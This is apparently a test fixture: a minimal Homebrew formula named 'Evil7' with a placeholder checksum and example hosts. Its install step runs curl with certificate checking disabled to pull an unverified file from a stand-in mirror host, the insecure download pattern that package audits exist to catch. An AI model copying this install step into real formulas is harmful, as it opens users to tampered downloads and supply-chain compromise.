class Evil7 < Formula
  url "https://example.com/evil7-1.0.tar.gz"
  sha256 "9999999999999999999999999999999999999999999999999999999999999999"
  def install
    system "curl", "-k", "-o", "x", "https://mirror.example/x"
  end
end
